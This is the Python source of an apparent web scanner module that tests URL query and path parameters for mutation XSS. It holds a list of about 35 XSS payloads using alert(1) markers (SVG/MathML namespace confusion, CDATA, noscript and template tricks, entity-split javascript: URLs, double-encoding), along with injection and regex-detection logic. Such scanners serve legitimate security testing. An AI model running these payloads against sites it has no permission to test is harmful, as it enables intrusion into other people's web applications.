"""
Mutation XSS (mXSS) Scanner

Browser HTML parsers sometimes "mutate" input during parsing — content that
looks safe gets transformed into dangerous HTML.  Classic sanitizers that
run on the server-side string can be bypassed this way.

Examples:
  Input:  <noscript><p title="</noscript><img src=x onerror=alert(1)>">
  Parser: Sees </noscript> as closing tag → img tag becomes live

  Input:  <math><mi><mglyph><svg><mtext></math><svg onload=alert(1)>
  Parser: Namespace switch SVG→MathML confuses sanitizer context

  Input:  <svg><![CDATA[</svg><script>alert(1)</script>]]>
  Parser: CDATA in SVG context leaks script

Strategy:
  1. For each URL parameter, send mXSS payloads
  2. Use Playwright to render the page and inspect the LIVE DOM
  3. Check if dangerous elements/handlers were created after mutation
  4. Static fallback: check raw response for unencoded dangerous patterns
"""

from __future__ import annotations

import re
import logging
from typing import List, Dict, Optional, TYPE_CHECKING
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

if TYPE_CHECKING:
    pass

logger = logging.getLogger("akha.mxss")

MXSS_MARKER = "akha-mxss"


class MXSSEngine:
    """
    Mutation XSS scanner.

    Uses static HTTP analysis as primary method, with optional Playwright
    verification for confirmed execution.  No browser required for basic
    mXSS pattern detection.
    """


    NAMESPACE_PAYLOADS = [
        '<math><mtext></math><svg><svg onload=alert(1)>',
        '<math><mi><mglyph><svg><mtext></math><svg onload=alert(1)>',
        '<math><annotation-xml encoding="text/html"><svg onload=alert(1)></svg></annotation-xml></math>',
        '<svg><foreignObject><math><mi><mglyph><svg><mtext></svg>',
        '<form><math><mtext></form><form><mglyph><svg><mtext>'
        '</svg><img src onerror=alert(1)>',
    ]

    CDATA_PAYLOADS = [
        '<svg><![CDATA[</svg><script>alert(1)</script>]]>',
        '<math><![CDATA[</math><script>alert(1)</script>]]>',
        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" '
        '""><![CDATA[</p><script>alert(1)</script>]]>',
    ]

    NOSCRIPT_PAYLOADS = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<noscript><p title="</noscript><svg onload=alert(1)>">',
    ]

    TEMPLATE_PAYLOADS = [
        '<template><script>alert(1)</script></template>',
        '<template id=x><img src=x onerror=alert(1)></template>',
        '<template><svg onload=alert(1)></template>',
    ]

    ATTRIBUTE_MUTATION_PAYLOADS = [
        '<img src=`x` onerror=alert(1)>',
        '<a href="java&#x09;script:alert(1)">click</a>',
        '<a href="java&#x0A;script:alert(1)">click</a>',
        '<a href="java&#x0D;script:alert(1)">click</a>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '< script>alert(1)</ script>',
        '<ScRiPt>alert(1)</ScRiPt>',
    ]

    DOUBLE_DECODE_PAYLOADS = [
        '&#x26;lt;script&#x26;gt;alert(1)&#x26;lt;/script&#x26;gt;',
        '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;',
        '%253Cscript%253Ealert(1)%253C/script%253E',
        '%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B',
    ]

    HTML5_QUIRK_PAYLOADS = [
        '<table><tr><td><script>alert(1)</script>',
        '<table><script>alert(1)</script></table>',
        '<!--><svg onload=alert(1)>',
        '<!-- --><svg onload=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
        '<base href="javascript:/""><svg/onload=alert(1)>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<table><tbody><tr><td><form><input name=action value=javascript:alert(1)>',
        '<svg><foreignObject><div><style>*{x:expression(alert(1))}</style></div></foreignObject></svg>',
        '<template><script>alert(1)</script></template>',
        '<math><mi xlink:href="javascript:alert(1)"></mi></math>',
    ]

    ALL_PAYLOADS: List[str] = (
        NAMESPACE_PAYLOADS
        + CDATA_PAYLOADS
        + NOSCRIPT_PAYLOADS
        + TEMPLATE_PAYLOADS
        + ATTRIBUTE_MUTATION_PAYLOADS
        + DOUBLE_DECODE_PAYLOADS
        + HTML5_QUIRK_PAYLOADS
    )

    STATIC_CONFIRM_PATTERNS = [
        re.compile(r'<svg[^>]*\bonload\s*=', re.IGNORECASE),
        re.compile(r'<img[^>]*\bonerror\s*=', re.IGNORECASE),
        re.compile(r'<script[^>]*>\s*alert\s*\(', re.IGNORECASE | re.DOTALL),
        re.compile(r'<[a-z]+[^>]+\bon\w+\s*=\s*["\']?alert', re.IGNORECASE),
        re.compile(r'javascript:\s*alert\s*\(', re.IGNORECASE),
    ]

    def __init__(self, http_client, config, execution_verifier=None):
        self.client = http_client
        self.config = config
        self.verifier = execution_verifier  # Optional Playwright verifier
        self._stopped = False

    def stop(self):
        self._stopped = True


    def scan(self, url: str, parameters: List[Dict]) -> List[Dict]:
        """
        Test URL parameters for Mutation XSS.

        For each parameter:
          1. Send each mXSS payload via HTTP
          2. Check raw response for dangerous unencoded patterns
          3. If execution_verifier available, confirm JS execution in browser
        """
        findings = []

        for param in parameters:
            if self._stopped:
                break

            param_name = param.get('name', '')
            location = param.get('location', 'query')

            if location not in ('query', 'url', 'GET', 'path'):
                continue

            probe_token = f"{MXSS_MARKER}-probe"
            try:
                probe_url = self._build_url(url, param_name, probe_token, location, param)
                probe_resp = self.client.get(probe_url, timeout=self.config.timeout)
                if probe_token not in probe_resp.text:
                    continue
            except Exception:
                continue

            for payload in self.ALL_PAYLOADS:
                if self._stopped:
                    break

                try:
                    test_url = self._build_url(url, param_name, payload, location, param)
                    response = self.client.get(test_url, timeout=self.config.timeout)
                    body = response.text

                    static_hit = self._static_check(body, payload)
                    if not static_hit:
                        continue

                    if self._is_plain_reflection(body, payload):
                        continue

                    executed = False
                    exec_evidence = None
                    if self.verifier:
                        try:
                            result = self.verifier.verify(test_url, payload)
                            executed = result.executed
                            exec_evidence = result.evidence
                        except Exception:
                            logger.debug("Suppressed exception", exc_info=True)

                    confidence = 85 if executed else 55
                    status = 'Vulnerability Detected' if executed else 'Potential mXSS'

                    findings.append({
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'test_url': test_url,
                        'type': 'mxss',
                        'subtype': self._classify_payload(payload),
                        'status': status,
                        'confidence': confidence,
                        'context': {'Location': 'HTML', 'Type': 'mXSS'},
                        'bypass_technique': f'Mutation XSS ({self._classify_payload(payload)})',
                        'proof': (
                            f'mXSS payload caused dangerous pattern in response.\n'
                            f'URL: {test_url}\n'
                            f'Payload: {payload}\n'
                            + (f'Browser confirmed execution: {exec_evidence}' if executed else
                               'Static analysis: dangerous unencoded HTML found in response')
                        ),
                        'request': f'GET {test_url} HTTP/1.1\nHost: {urlparse(url).netloc}',
                        'response': body[:500],
                        'validated': executed,
                        'execution_evidence': exec_evidence,
                        'bypass_technique_detail': self._classify_payload(payload),
                    })

                    if executed:
                        break

                except Exception as e:
                    if self.config.verbose:
                        logger.debug("mXSS test error: %s", e)
                    continue

        return findings


    def _build_url(self, url: str, param_name: str, payload: str,
                   location: str, param: Dict) -> str:
        """Build test URL with mXSS payload injected"""
        parsed = urlparse(url)
        if location == 'path':
            segments = parsed.path.split('/')
            path_index = int(param.get('path_index', 0) or 0)
            path_index = max(0, min(path_index, len(segments) - 1))
            segments[path_index] = payload
            new_path = '/'.join(segments)
            return urlunparse((
                parsed.scheme, parsed.netloc, new_path,
                parsed.params, parsed.query, parsed.fragment,
            ))

        params = dict(parse_qs(parsed.query))
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment,
        ))

    def _static_check(self, body: str, payload: str) -> bool:
        """
        Check if the HTTP response contains the mXSS payload in a dangerous
        (unencoded, executable) form.

        Returns True if a dangerous pattern is found.
        """
        if '<' not in body and 'javascript:' not in body.lower():
            return False

        if not self._payload_evidence_in_body(body, payload):
            return False

        for pattern in self.STATIC_CONFIRM_PATTERNS:
            if pattern.search(body):
                return True

        return False

    def _payload_evidence_in_body(self, body: str, payload: str) -> bool:
        """Require payload-linked evidence to reduce unrelated static hits."""
        body_lower = body.lower()
        payload_lower = payload.lower()

        if payload in body or payload_lower in body_lower:
            return True

        normalize = lambda s: re.sub(r'\s+', '', s).lower()
        p_norm = normalize(payload)
        b_norm = normalize(body)
        if p_norm and len(p_norm) <= 200 and p_norm in b_norm:
            return True

        tokens = []
        seen = set()
        for tok in re.findall(r'[a-zA-Z][a-zA-Z0-9_-]{5,}', payload_lower):
            if tok not in seen:
                seen.add(tok)
                tokens.append(tok)
        if not tokens:
            return False

        hits = sum(1 for t in tokens[:5] if t in body_lower)
        return hits >= 2

    def _is_plain_reflection(self, body: str, payload: str) -> bool:
        """Return True when response appears to contain direct reflected payload.

        mXSS should represent parser mutation behavior, not straightforward
        reflected XSS where the payload is echoed unmodified.
        """
        body_lower = body.lower()
        payload_lower = payload.lower()

        direct_primitives = (
            '<script', '<img', '<svg', '<iframe',
            'onerror=', 'onload=', 'javascript:'
        )
        if not any(p in payload_lower for p in direct_primitives):
            return False

        if payload in body or payload_lower in body_lower:
            return True

        normalize = lambda s: re.sub(r'\s+', '', s).lower()
        p_norm = normalize(payload)
        b_norm = normalize(body)
        if p_norm and len(p_norm) <= 300 and p_norm in b_norm:
            return True

        return False

    def _classify_payload(self, payload: str) -> str:
        """Classify mXSS payload into a human-readable category"""
        pl = payload.lower()
        if '<math' in pl or '<svg' in pl and 'math' in pl:
            return 'Namespace Confusion (SVG/MathML)'
        if 'cdata' in pl or '![' in pl:
            return 'CDATA Mutation'
        if '<noscript' in pl:
            return 'Noscript Mutation'
        if '<template' in pl:
            return 'Template Element Mutation'
        if 'java&#x' in pl or 'java&#0' in pl:
            return 'Attribute Mutation (Entity in Protocol)'
        if '%25' in payload or '&amp;' in payload:
            return 'Double-Decode Mutation'
        if '<table' in pl or '<!-' in pl or 'srcdoc' in pl:
            return 'HTML5 Parser Quirk'
        if '`' in payload and 'onerror' in pl:
            return 'Attribute Mutation (Backtick Delimiter)'
        return 'Generic Mutation'
